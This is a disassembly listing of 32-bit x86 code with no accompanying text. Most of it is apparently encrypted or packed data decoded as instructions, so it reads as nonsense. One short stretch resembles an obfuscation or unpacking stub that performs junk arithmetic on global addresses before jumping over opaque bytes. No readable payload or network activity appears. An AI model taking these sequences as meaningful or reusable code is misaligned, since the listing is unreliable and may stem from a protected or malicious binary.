  4094ff:	xchg   edi,eax
  409500:	inc    ebx
  409501:	(bad)  
  409503:	jno    0x409536
  409505:	mov    esi,ds
  409507:	push   ebp
  409508:	in     eax,dx
  409509:	sbb    ecx,DWORD PTR [esi-0x3d9f1e39]
  40950f:	mov    dl,0x9d
  409511:	xor    edx,ecx
  409513:	bound  esi,QWORD PTR [edx-0x5e]
  409516:	mov    eax,ds:0x52a67a5f
  40951b:	dec    edx
  40951c:	push   eax
  40951d:	xor    eax,0xd88dcaf5
  409522:	mov    ch,0x18
  409524:	xor    DWORD PTR [ebx],edi
  409526:	push   es
  409527:	xor    DWORD PTR [ebp+edi*1+0x68],ebp
  40952b:	icebp  
  40952c:	dec    esp
  40952d:	addr16 xchg bl,ch
  409530:	or     al,0xc5
  409532:	push   0x8816a242
  409537:	(bad)  
  409538:	sub    al,0x67
  40953a:	mov    eax,0x7989cee1
  40953f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409540:	sbb    eax,0x2acf7ab4
  409545:	fwait
  409546:	pop    ss
  409547:	sar    BYTE PTR ds:0x7a50df71,0x76
  40954e:	mov    dl,0xb6
  409550:	xchg   ecx,eax
  409551:	out    dx,al
  409552:	shl    ebp,cl
  409554:	(bad)  
  409556:	cmp    BYTE PTR [edi+0x3b],bl
  409559:	(bad)  
  40955a:	xchg   edx,eax
  40955b:	nop
  40955c:	inc    edi
  40955d:	sub    al,0x4e
  40955f:	or     dh,bl
  409561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409562:	sbb    eax,0x34deebd5
  409567:	mov    BYTE PTR [edi+0x37e39574],bh
  40956d:	sub    BYTE PTR [esi+0x1abfbec4],ah
  409573:	sub    ebx,DWORD PTR [edx]
  409575:	imul   BYTE PTR [esp+ebx*2+0x642e598f]
  40957c:	std    
  40957d:	cld    
  40957e:	jbe    0x4095fc
  409580:	into   
  409581:	call   0x8c154706
  409586:	and    ebp,esp
  409588:	mov    al,ds:0x6de434aa
  40958d:	in     eax,0x61
  40958f:	mov    esp,0x7cab05a4
  409594:	pusha  
  409595:	and    eax,0x64751671
  40959a:	(bad)  
  40959b:	ror    BYTE PTR [eax+edx*1-0x20],1
  40959f:	add    edx,ecx
  4095a1:	stos   BYTE PTR es:[edi],al
  4095a2:	add    BYTE PTR ds:0x3d7351a7,bl
  4095a8:	in     al,dx
  4095a9:	dec    esp
  4095aa:	das    
  4095ab:	pop    esp
  4095ac:	ret    0x5a14
  4095af:	pop    ss
  4095b0:	mov    WORD PTR [eax-0xcfaeadd],?
  4095b6:	neg    DWORD PTR [ebp-0x35]
  4095b9:	mov    esi,0xee4f057d
  4095be:	(bad)  
  4095bf:	xor    BYTE PTR ds:0xdd9886ca,dh
  4095c5:	pop    edx
  4095c6:	sbb    BYTE PTR [edi+eiz*1-0x16154db4],bl
  4095cd:	mov    eax,ds:0x3feef269
  4095d2:	jecxz  0x40959f
  4095d4:	pushf  
  4095d5:	mov    BYTE PTR [ebx+ecx*4-0x59],ah
  4095d9:	mov    edi,0xe427499b
  4095de:	rol    BYTE PTR [edx+0x41b94bfe],1
  4095e4:	loopne 0x40956a
  4095e6:	xor    BYTE PTR [esi+ecx*8],ch
  4095e9:	ja     0x4095d3
  4095eb:	and    ch,dl
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e5a:0xbc1b564e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	dec    ebx
  40960d:	sahf   
  40960e:	scas   al,BYTE PTR es:[edi]
  40960f:	jno    0x40964a
  409611:	jmp    0x6df8:0xbfe59c7f
  409618:	push   0x25
  40961a:	adc    eax,0xf924eeaf
  40961f:	mov    edx,0xc8eb6051
  409624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409625:	test   ch,ch
  409627:	adc    eax,0x4c601c3b
  40962c:	daa    
  40962d:	xor    dl,dl
  40962f:	aas    
  409630:	out    0xa1,al
  409632:	mov    ?,WORD PTR [edx+edi*8-0x54]
  409636:	call   0x533f44d4
  40963b:	mov    edi,0x1ffbc25d
  409640:	mov    al,ds:0x993d6a75
  409645:	add    BYTE PTR ds:[eax+0x5f],bh
  409649:	cmp    BYTE PTR [eax+0x232b6c02],bh
  40964f:	scas   al,BYTE PTR es:[edi]
  409650:	pop    ebx
  409651:	inc    esi
  409652:	aaa    
  409653:	dec    ebp
  409654:	stos   BYTE PTR es:[edi],al
  409655:	js     0x40961b
  409657:	add    eax,0xf89a554b
  40965c:	push   0x83041f17
  409661:	pop    es
  409662:	or     BYTE PTR [eax],ah
  409664:	mov    edi,esp
  409666:	rcl    esi,1
  409668:	mov    ds:0x707ab482,al
  40966d:	xchg   esi,eax
  40966e:	xor    ah,ch
  409670:	xor    BYTE PTR [ecx+0x4f],bh
  409673:	scas   al,BYTE PTR es:[edi]
  409674:	lds    ebp,FWORD PTR [esi+ebp*1+0x6c]
  409678:	(bad)  
  409679:	test   DWORD PTR [eax],0xb4b0209
  40967f:	int3   
  409680:	dec    ebx
  409681:	or     DWORD PTR [ecx-0x78259a7b],ebp
  409687:	imul   edi,DWORD PTR [edi+ebx*4+0x7f418ad0],0x3c07caf3
  409692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409693:	or     al,ah
  409695:	retf   
  409696:	sub    DWORD PTR [edx-0x37],0x2898b602
  40969d:	cmp    al,0xbd
  40969f:	mov    al,ds:0x1b7dcf61
  4096a4:	mov    ch,0xf5
  4096a6:	js     0x409653
  4096a8:	sbb    DWORD PTR [edx-0x35],edi
  4096ab:	mov    eax,0xf45551bb
  4096b0:	xlat   BYTE PTR ds:[ebx]
  4096b1:	cmp    esp,DWORD PTR [ebx+0x1c13fc6d]
  4096b7:	in     eax,0x19
  4096b9:	pop    es
  4096ba:	mov    esp,DWORD PTR [esp+ecx*2]
  4096bd:	cdq    
  4096be:	cwde   
  4096bf:	inc    ebp
  4096c0:	in     eax,dx
  4096c1:	sbb    al,0x40
  4096c3:	dec    ecx
  4096c4:	cmp    al,0xb4
  4096c6:	jbe    0x4096d9
  4096c8:	inc    edi
  4096c9:	xor    DWORD PTR [ecx],esp
  4096cb:	xor    DWORD PTR [ebx+esi*8],ecx
  4096ce:	jge    0x409686
  4096d0:	xchg   ebx,eax
  4096d1:	dec    esp
  4096d2:	sub    ah,bl
  4096d4:	int3   
  4096d5:	das    
  4096d6:	sub    al,0xea
  4096d8:	mov    ebp,0x6312afc1
  4096dd:	shl    DWORD PTR [eax-0x52d2b28a],0x9a
  4096e4:	xor    ebx,edx
  4096e6:	pusha  
  4096e7:	pop    esi
  4096e8:	mov    edi,0x77120151
  4096ed:	adc    bl,0xf
  4096f0:	outs   dx,BYTE PTR ds:[esi]
  4096f1:	mov    al,ds:0x83f322e0
  4096f6:	dec    eax
  4096f7:	pop    esp
  4096f8:	push   esi
  4096f9:	bound  ebp,QWORD PTR [edx+0x45]
  4096fc:	cli    
  4096fd:	pop    esp
  4096fe:	leave  
  4096ff:	out    dx,al
  409700:	dec    edx
  409701:	daa    
  409702:	push   edi
  409703:	and    al,0x9d
  409705:	daa    
  409706:	sub    eax,0x18bc57c9
  40970b:	pop    ecx
  40970c:	ss push esp
  40970e:	lahf   
  40970f:	dec    esp
  409710:	adc    al,0xf
  409712:	test   BYTE PTR [edx],bh
  409714:	mov    edi,0x28e1fb61
  409719:	les    ebp,FWORD PTR [edi-0x4c8c80c3]
  40971f:	int3   
  409720:	mov    ds:0x310cfea4,eax
  409725:	sub    al,0xb4
  409727:	fnstsw WORD PTR [ebp-0x6]
  40972a:	enter  0x8937,0xb4
  40972e:	out    0x30,al
  409730:	jmp    0x2c9ad030
  409735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409736:	mov    esi,0xe5a4afe8
  40973b:	adc    eax,0x4c522074
  409740:	fisub  WORD PTR ds:0x91832db1
  409746:	sub    edi,edx
  409748:	ds mov esi,edx
  40974b:	cs and eax,0x33cd2439
  409751:	call   0xa6b3:0x4a5adcc
  409758:	mov    edx,0x41f64038
  40975d:	mov    dl,0xea
  40975f:	add    esp,DWORD PTR [edi+0x56038da4]
  409765:	in     eax,dx
  409766:	pop    edx
  409767:	(bad)  
  409768:	lock push ebx
  40976a:	clc    
  40976b:	and    ecx,DWORD PTR es:[esi-0x68]
  40976f:	loope  0x40971d
  409771:	add    al,0xeb
  409773:	mov    bl,0x62
  409775:	data16 (bad) [ecx-0x3a]
  409779:	sbb    DWORD PTR [ecx],0x63
  40977c:	xchg   DWORD PTR [edx+0x25],esi
  40977f:	mov    al,0xf2
  409781:	jns    0x4097ce
  409783:	lods   eax,DWORD PTR ds:[esi]
  409784:	fcmovnu st,st(0)
  409786:	into   
  409787:	jp     0x409782
  409789:	ja     0x4097ae
  40978b:	mov    ds:0x106762c8,al
  409790:	jg     0x4097c6
  409792:	mov    ebx,eax
  409794:	jecxz  0x409741
  409796:	xor    eax,0xe0c2fc65
  40979b:	xor    eax,0x60140928
  4097a0:	mov    DWORD PTR [ecx+0x60],0xda36682f
  4097a7:	cld    
  4097a8:	push   0x16
  4097aa:	test   DWORD PTR [esi-0x61d202a5],edi
  4097b0:	in     al,dx
  4097b1:	jle    0x40982d
  4097b3:	mov    bl,0x45
  4097b5:	fistp  DWORD PTR [edi+0x75]
  4097b8:	or     edi,ecx
  4097ba:	sub    edx,esi
  4097bc:	cmp    eax,0x11f2ee86
  4097c1:	scas   al,BYTE PTR es:[edi]
  4097c2:	icebp  
  4097c3:	jb     0x409789
  4097c5:	shl    esi,cl
  4097c7:	push   edx
  4097c8:	cli    
  4097c9:	mov    dh,0x8e
  4097cb:	(bad)  
  4097cc:	or     eax,0xfca11771
  4097d1:	or     DWORD PTR [ebx+0x5d5d5a44],ecx
  4097d7:	pop    esi
  4097d8:	push   DWORD PTR [edx]
  4097da:	jbe    0x4097f8
  4097dc:	sub    DWORD PTR [ebp-0x18],ecx
  4097df:	stos   DWORD PTR es:[edi],eax
  4097e0:	dec    esp
  4097e1:	inc    edi
  4097e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e3:	(bad)  
  4097e4:	sub    DWORD PTR [ebp+0x42],edx
  4097e7:	add    BYTE PTR [eax-0x2d],ch
  4097ea:	lods   eax,DWORD PTR es:[esi]
  4097ec:	sbb    ecx,DWORD PTR [eax-0x6ee059cb]
  4097f2:	bound  edi,QWORD PTR [esi]
  4097f4:	adc    eax,0x51a98399
  4097f9:	xchg   ecx,eax
  4097fa:	nop
  4097fb:	ret    0x9360
  4097fe:	add    cl,BYTE PTR [edi-0x47]
  409801:	jae    0x4097ea
  409803:	sbb    al,0x40
  409805:	dec    edi
  409806:	test   dl,dl
  409808:	mov    dl,0x42
  40980a:	add    al,BYTE PTR [edi]
  40980c:	and    BYTE PTR [ecx],cl
  40980e:	sti    
  40980f:	xor    al,0xd4
  409811:	xchg   DWORD PTR [edx-0x32],ebx
  409814:	jne    0x409895
  409816:	push   ebp
  409817:	xor    ah,BYTE PTR cs:[ecx+0x47]
  40981b:	scas   al,BYTE PTR es:[edi]
  40981c:	sbb    eax,0x299a9f6f
  409821:	ins    DWORD PTR es:[edi],dx
  409822:	popa   
  409823:	(bad)  
  409824:	mov    dx,0xd45d
  409828:	fcmove st,st(2)
  40982a:	(bad)  
  40982b:	call   0x79da9f0
  409830:	adc    eax,0x93166470
  409835:	mov    esp,0x3bf4458b
  40983a:	ret    
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4337df
  40986f:	xor    DWORD PTR ds:0x433717,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4337db,0x4337ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433767,0x433813
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4336fb
  4098a6:	sub    DWORD PTR ds:0x4337df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	fbstp  TBYTE PTR [eax]
  4098c2:	adc    BYTE PTR [edx-0x4c],dh
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	ret    
  4098cd:	call   FWORD PTR [eax]
  4098cf:	mov    cl,0x18
  4098d1:	out    0xe8,al
  4098d3:	rcl    DWORD PTR [ecx-0x52],1
  4098d6:	xor    DWORD PTR [edx+eax*4+0x38],0x424aacd5
  4098de:	retf   
  4098df:	cmp    BYTE PTR [eiz*8-0x757a98b6],0xbb
  4098e7:	(bad)  
  4098e8:	int3   
  4098e9:	jl     0x4098ed
  4098eb:	aas    
  4098ec:	add    dh,cl
  4098ee:	cld    
  4098ef:	mov    BYTE PTR [edx-0x1858f570],0x63
  4098f6:	or     BYTE PTR [eax-0x42],dh
  4098f9:	inc    ebx
  4098fa:	inc    edx
  4098fb:	fst    QWORD PTR [edi+0x56]
  4098fe:	ja     0x40988b
  409900:	fcomp  QWORD PTR [esp+eiz*2]
  409903:	xchg   esi,eax
  409904:	lock mov edx,0xf1d984e7
  40990a:	dec    edi
  40990b:	rcr    BYTE PTR [edi-0x285559f1],1
  409911:	les    esp,FWORD PTR [eax]
  409913:	fiadd  WORD PTR fs:[eax+0x6565bbd]
  40991a:	loopne 0x4098a8
  40991c:	test   eax,0x15d3007a
  409921:	dec    eax
  409922:	push   ebx
  409923:	ds shl esp,0x97
  409927:	jecxz  0x409907
  409929:	das    
  40992a:	and    esi,DWORD PTR [ebx-0x493210e8]
  409930:	sub    al,0x83
  409932:	adc    ch,ah
  409934:	add    ah,BYTE PTR [edi]
  409936:	shl    DWORD PTR [ecx],1
  409938:	lea    esp,[edi-0x250aa6ce]
  40993e:	xor    BYTE PTR [esi],dh
  409940:	ja     0x40996d
  409942:	fimul  WORD PTR [ecx-0x26]
  409945:	and    bl,BYTE PTR [eax]
  409947:	pop    edx
  409948:	inc    esp
  409949:	or     dl,BYTE PTR [ecx]
  40994b:	mov    bh,0x43
  40994d:	jmp    0x409984
  40994f:	jb     0x4098f7
  409951:	sar    BYTE PTR [eax],1
  409953:	mov    cl,0xb7
  409955:	push   ecx
  409956:	adc    eax,0x8606480c
  40995b:	mov    WORD PTR [ebp-0x17afe92a],?
  409961:	mov    edi,cs
  409963:	adc    eax,0x74eae632
  409968:	inc    ebx
  409969:	mov    WORD PTR [edx+0x3ebba253],gs
  40996f:	mov    ebp,DWORD PTR [esi+0x3e]
  409972:	faddp  st(3),st
  409974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409975:	enter  0x4dc2,0xb2
  409979:	xor    ch,BYTE PTR [ecx-0x6c]
  40997c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40997d:	mov    dh,BYTE PTR [edi]
  40997f:	(bad)  
  409980:	or     al,0xc1
  409982:	sar    BYTE PTR [esi+0x4e],cl
  409985:	sub    cl,ch
  409987:	rcr    DWORD PTR [ecx-0x1b567bb8],0x64
  40998e:	adc    bh,BYTE PTR [ecx]
  409990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409991:	and    al,0xf6
  409993:	sti    
  409994:	aam    0x71
  409996:	mov    bl,0x1f
  409998:	add    DWORD PTR [ebx+0x66e847ba],esi
  40999e:	xlat   BYTE PTR ds:[ebx]
  40999f:	xchg   ebp,eax
  4099a0:	xor    BYTE PTR [esp+esi*2],0xf
  4099a4:	add    BYTE PTR [edx-0x6d],dh
  4099a7:	push   es
  4099a8:	jg     0x409944
  4099aa:	cld    
  4099ab:	ret    0x7821
  4099ae:	aam    0x9f
  4099b0:	test   eax,0xb1492df3
  4099b5:	or     BYTE PTR [ebx+0x5823fcf2],0xb
  4099bc:	inc    ecx
  4099bd:	lahf   
  4099be:	stos   BYTE PTR es:[edi],al
  4099bf:	sbb    ch,BYTE PTR [esp+edi*2]
  4099c2:	rcr    ah,cl
  4099c4:	jge    0x409a3f
  4099c6:	fucomip st,st(4)
  4099c8:	mov    esi,0x994c3e50
  4099cd:	loop   0x4099aa
  4099cf:	(bad)  
  4099d0:	je     0x4099c7
  4099d2:	jg     0x409969
  4099d4:	xchg   esp,eax
  4099d5:	mov    eax,0x9cb2bb99
  4099da:	js     0x4099ce
  4099dc:	in     eax,0x80
  4099de:	sbb    DWORD PTR [eax],ecx
  4099e0:	and    eax,DWORD PTR [edi+0x0]
  4099e3:	shl    DWORD PTR [edx-0x2f],1
  4099e6:	xchg   esi,eax
  4099e7:	jno    0x4099df
  4099e9:	fcmovu st,st(7)
  4099eb:	xor    BYTE PTR [ebx],al
  4099ed:	test   eax,0xb62c6588
  4099f2:	jl     0x4099dd
  4099f4:	push   edx
  4099f5:	pop    edx
  4099f6:	jecxz  0x4099be
  4099f8:	ins    DWORD PTR es:[edi],dx
  4099f9:	and    BYTE PTR [edi+0x8],dl
  4099fc:	test   ch,ah
  4099fe:	cli    
  4099ff:	stc    
  409a00:	test   DWORD PTR [ebp-0x2a],0x825d6e96
  409a07:	sub    ebp,esp
  409a09:	pop    edi
  409a0a:	xchg   ebx,eax
  409a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a0c:	cmp    BYTE PTR [eax+0x64],bh
  409a0f:	fld    QWORD PTR [ecx+0x17e9f34d]
  409a15:	mov    edx,ds
  409a17:	xor    eax,0xe9226006
  409a1c:	lea    esi,[ecx]
  409a1e:	push   ds
  409a1f:	mov    ebp,ecx
  409a21:	cmp    ah,dl
  409a23:	mov    dh,BYTE PTR [ecx+0x10]
  409a26:	cli    
  409a27:	or     dh,cl
  409a29:	imul   esi,DWORD PTR [eax+0xd],0xcee825c6
  409a30:	(bad)  
  409a31:	out    0x69,al
  409a33:	out    dx,al
  409a34:	sbb    ah,dh
  409a36:	fsubrp st(3),st
  409a38:	jp     0x4099fa
  409a3a:	xchg   edi,eax
  409a3b:	dec    ebx
  409a3c:	cmp    DWORD PTR [ecx],esi
  409a3e:	sti    
  409a3f:	fistp  QWORD PTR [eax+0x21be8004]
  409a45:	push   edx
  409a46:	fsub   st,st(5)
  409a48:	scas   eax,DWORD PTR es:[edi]
  409a49:	pop    edi
  409a4a:	or     DWORD PTR [eax+0x75],0x2
  409a4e:	addr16 push 0xffffffc6
  409a51:	(bad)  
  409a53:	add    esp,DWORD PTR [edi-0xa114f55]
  409a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5a:	jl     0x409a10
  409a5c:	(bad)  
  409a5e:	mov    al,0x66
  409a60:	and    eax,esp
  409a62:	aaa    
  409a63:	mul    BYTE PTR [edx-0x5d]
  409a66:	loopne 0x409ad2
  409a68:	mov    edx,eax
  409a6a:	fadd   st,st(3)
  409a6c:	mov    eax,0x4b7c93af
  409a71:	in     eax,0xec
  409a73:	adc    DWORD PTR [edi+edx*4-0x6532271a],esi
  409a7a:	popa   
  409a7b:	ds cld 
  409a7d:	sub    ah,0x19
  409a80:	push   cs
  409a81:	sti    
  409a82:	xchg   ecx,eax
  409a83:	mov    bl,0x4c
  409a85:	enter  0x62fb,0x2b
  409a89:	pop    eax
  409a8a:	xchg   ebx,eax
  409a8b:	lds    ecx,FWORD PTR [eax+0x4e]
  409a8e:	cmp    al,0x3a
  409a90:	(bad)  
  409a91:	mov    al,0xfd
  409a93:	repnz outs dx,BYTE PTR ds:[esi]
  409a95:	jae    0x409afe
  409a97:	ss pop esp
  409a99:	jmp    0xae3a:0x5f799451
  409aa0:	or     dl,BYTE PTR [ecx]
  409aa2:	xor    dl,dl
  409aa4:	es hlt 
  409aa6:	or     ebp,ebp
  409aa8:	stos   DWORD PTR es:[edi],eax
  409aa9:	xchg   edi,eax
  409aaa:	(bad)  
  409aab:	daa    
  409aac:	retf   
  409aad:	inc    ebx
  409aae:	jmp    0x409a58
  409ab0:	in     eax,0x51
  409ab2:	inc    edx
  409ab3:	jge    0x409a6a
  409ab5:	xchg   BYTE PTR [esp+ebx*1+0x107f0841],bh
  409abc:	stos   DWORD PTR es:[edi],eax
  409abd:	stos   BYTE PTR es:[edi],al
  409abe:	push   ecx
  409abf:	pusha  
  409ac0:	cmp    BYTE PTR [edx],al
  409ac2:	add    DWORD PTR ds:0xde9beb4b,ebp
  409ac8:	adc    ah,BYTE PTR ds:0xab7cc86d
  409ace:	add    dl,cl
  409ad0:	ds fcmovnbe st,st(0)
  409ad3:	adc    eax,0xb9b8713c
  409ad8:	or     edx,ebp
  409ada:	pop    eax
  409adb:	dec    edi
  409adc:	mov    ch,0xe4
  409ade:	sub    eax,esi
  409ae0:	pop    ecx
  409ae1:	xchg   edi,eax
  409ae2:	cli    
  409ae3:	pop    edx
  409ae4:	add    eax,0x3a844e51
  409ae9:	idiv   BYTE PTR ds:0x76bfdb60
  409aef:	and    esp,DWORD PTR [esi+ebx*8-0x10]
  409af3:	pushf  
  409af4:	sbb    BYTE PTR [ecx+0x15e3fea1],al
  409afa:	popa   
  409afb:	loope  0x409b5a
  409afd:	xor    DWORD PTR [edi+0x284b755d],ebx
  409b03:	and    DWORD PTR [ecx+ebp*2+0x47c463e5],0x2c
  409b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0c:	sbb    DWORD PTR [ecx],edx
  409b0e:	push   edx
  409b0f:	sbb    al,BYTE PTR [ecx]
  409b11:	pop    eax
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43379f,0x433753
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x4c9d1dd4]
  409b32:	dec    ebx
  409b33:	jle    0x409b19
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	add    cl,ah
  409b3d:	inc    edx
  409b3e:	repz sar eax,cl
  409b41:	or     BYTE PTR [edi],cl
  409b43:	jno    0x409b75
  409b45:	fwait
  409b46:	cmc    
  409b47:	push   ebx
  409b48:	aam    0x94
  409b4a:	into   
  409b4b:	and    eax,0xe186db6
  409b50:	lea    ecx,[esi+0x4fc9ada3]
  409b56:	hlt    
  409b57:	mov    al,ds:0xe37defa2
  409b5c:	call   0xa199f696
  409b61:	or     al,0x9b
  409b63:	fwait
  409b64:	xor    al,bl
  409b66:	fucom  st(5)
  409b68:	aas    
  409b69:	mov    dh,0x8e
  409b6b:	jecxz  0x409bbd
  409b6d:	hlt    
  409b6e:	adc    ch,BYTE PTR [eax-0x30]
  409b71:	out    0xe9,al
  409b73:	fisttp QWORD PTR [ecx+edx*1+0x236597e0]
  409b7a:	add    esi,eax
  409b7c:	sbb    al,0x2
  409b7e:	lods   eax,DWORD PTR ds:[esi]
  409b7f:	ret    0x4289
  409b82:	cmp    ebp,ebp
  409b84:	ret    
  409b85:	jo     0x409bb0
  409b87:	push   ebx
  409b88:	cs in  al,dx
  409b8a:	xchg   edi,eax
  409b8b:	mov    bh,0x47
  409b8d:	push   ecx
  409b8e:	push   edi
  409b8f:	sbb    dh,dh
  409b91:	mov    edx,0xcbd029d4
  409b96:	test   al,0x5c
  409b98:	pop    edi
  409b99:	adc    bh,cl
  409b9b:	fidiv  DWORD PTR [esi+0x764b5195]
  409ba1:	pop    edx
  409ba2:	or     ecx,esp
  409ba4:	cmp    BYTE PTR [eax-0x24],dh
  409ba7:	push   esp
  409ba8:	pop    esi
  409ba9:	cmp    DWORD PTR [eax-0x2ee03508],0xa298bf42
  409bb3:	ins    BYTE PTR es:[edi],dx
  409bb4:	xor    ch,0x98
  409bb7:	mov    esi,0x28ef7299
  409bbc:	scas   al,BYTE PTR es:[edi]
  409bbd:	(bad)  
  409bbe:	out    dx,al
  409bbf:	adc    eax,0xff02be19
  409bc4:	dec    esp
  409bc5:	and    DWORD PTR [edi+0x47024d65],ebp
  409bcb:	(bad)  
  409bcd:	mov    ebx,0xbbce9226
  409bd2:	add    DWORD PTR [esi],edx
  409bd4:	dec    ebp
  409bd5:	add    bl,cl
  409bd7:	jmp    0xb293bc67
  409bdc:	mov    ds:0x1b8b3a61,al
  409be1:	mov    ah,0x31
  409be3:	push   cs
  409be4:	jl     0x409b80
  409be6:	dec    edi
  409be7:	adc    esi,DWORD PTR [ecx]
  409be9:	cld    
  409bea:	std    
  409beb:	out    0xf4,al
  409bed:	and    DWORD PTR [ebx],edi
  409bef:	pop    ecx
  409bf0:	mov    bl,0xea
  409bf2:	pop    edi
  409bf3:	pop    edx
  409bf4:	ret    0x7d3d
  409bf7:	inc    esi
  409bf8:	cmp    edi,DWORD PTR [eax+ecx*4+0x7a]
  409bfc:	jge    0x409c26
  409bfe:	nop
  409bff:	sbb    DWORD PTR [edi-0x72],0xffffffeb
  409c03:	and    al,0x32
  409c05:	out    dx,eax
  409c06:	mov    BYTE PTR [eax+0x74],dh
  409c09:	ret    0xb
  409c0c:	pop    ds
  409c0d:	fucomp st(6)
  409c0f:	(bad)  
  409c10:	les    ebp,FWORD PTR [eax-0x39948c1d]
  409c16:	(bad)  
  409c17:	xlat   BYTE PTR ds:[ebx]
  409c18:	sti    
  409c19:	mov    edx,0x299ae52c
  409c1e:	cld    
  409c1f:	jle    0x409c67
  409c21:	aam    0xbe
  409c23:	int3   
  409c24:	or     DWORD PTR [edi+0x3911bd82],esi
  409c2a:	sub    al,0xd4
  409c2c:	push   ebp
  409c2d:	or     dh,dh
  409c2f:	jg     0x409ca2
  409c31:	xchg   esi,eax
  409c32:	sbb    eax,0x22d70e4d
  409c37:	sbb    al,0xf7
  409c39:	mov    eax,0x535eb1e6
  409c3e:	sahf   
  409c3f:	mov    al,0x56
  409c41:	rcr    DWORD PTR [eax-0x2150e766],0xeb
  409c48:	retf   0x7a58
  409c4b:	nop
  409c4c:	lahf   
  409c4d:	in     al,dx
  409c4e:	call   0x1d71:0xdde1ccf1
  409c55:	cwde   
  409c56:	push   0xffffffa2
  409c58:	push   edi
  409c59:	mov    eax,0x46da25bf
  409c5e:	arpl   WORD PTR [ebx],bx
  409c60:	mov    ch,0x1c
  409c62:	ins    BYTE PTR es:[edi],dx
  409c63:	bnd js 0x409ce5
  409c66:	inc    ebx
  409c67:	shl    BYTE PTR [eax+0x17d2e24c],cl
  409c6d:	push   cs
  409c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c6f:	mov    DWORD PTR [ebx+0x111662ae],edx
  409c75:	iret   
  409c76:	rcl    bh,1
  409c78:	sbb    DWORD PTR [edx+0x5],ebp
  409c7b:	aad    0xb5
  409c7d:	outs   dx,DWORD PTR ds:[esi]
  409c7e:	sbb    al,0xff
  409c80:	sahf   
  409c81:	mov    esi,0x6b4cbc5a
  409c86:	add    esp,ecx
  409c88:	push   ebx
  409c89:	daa    
  409c8a:	in     al,dx
  409c8b:	jmp    0xe5c6c826
  409c90:	xor    dl,cl
  409c92:	mov    edi,0x31f10db4
  409c97:	jg     0x409cf3
  409c99:	jae    0x409c58
  409c9b:	lods   al,BYTE PTR ds:[esi]
  409c9c:	outs   dx,BYTE PTR ds:[esi]
  409c9d:	xchg   ebp,eax
  409c9e:	nop
  409c9f:	data16 jno 0x409ce2
  409ca2:	out    0x58,eax
  409ca4:	(bad)  
  409ca5:	(bad)  
  409ca6:	jp     0x409cf7
  409ca8:	das    
  409ca9:	repz pushf 
  409cab:	dec    eax
  409cac:	add    ebp,DWORD PTR [ebx+0x57]
  409caf:	xchg   esi,eax
  409cb0:	mov    ebp,0x2b0e50f1
  409cb5:	js     0x409c5c
  409cb7:	jle    0x409cc6
  409cb9:	div    BYTE PTR [edi]
  409cbb:	mov    ah,BYTE PTR [edi+0x60fc3e23]
  409cc1:	inc    ebx
  409cc2:	outs   dx,DWORD PTR ds:[esi]
  409cc3:	cmp    al,0x9
  409cc5:	xchg   edx,eax
  409cc6:	into   
  409cc7:	or     eax,0x793e699c
  409ccc:	xchg   BYTE PTR [edi+0x65dd7a83],al
  409cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cd3:	test   eax,0x3e663a87
  409cd8:	mov    ebx,0x8057894a
  409cdd:	addr16 popf 
  409cdf:	aam    0x93
  409ce1:	dec    ebx
  409ce2:	fcmovu st,st(1)
  409ce4:	sbb    eax,0x2ae1ddb6
  409ce9:	xchg   ebx,eax
  409cea:	rol    DWORD PTR [edx],0xe7
  409ced:	popf   
  409cee:	nop
  409cef:	jmp    0xd514:0x1c961cdc
  409cf6:	xchg   ebx,eax
  409cf7:	cld    
  409cf8:	sub    eax,0xd9352c86
  409cfd:	inc    esp
  409cfe:	test   BYTE PTR [esi-0x34],ch
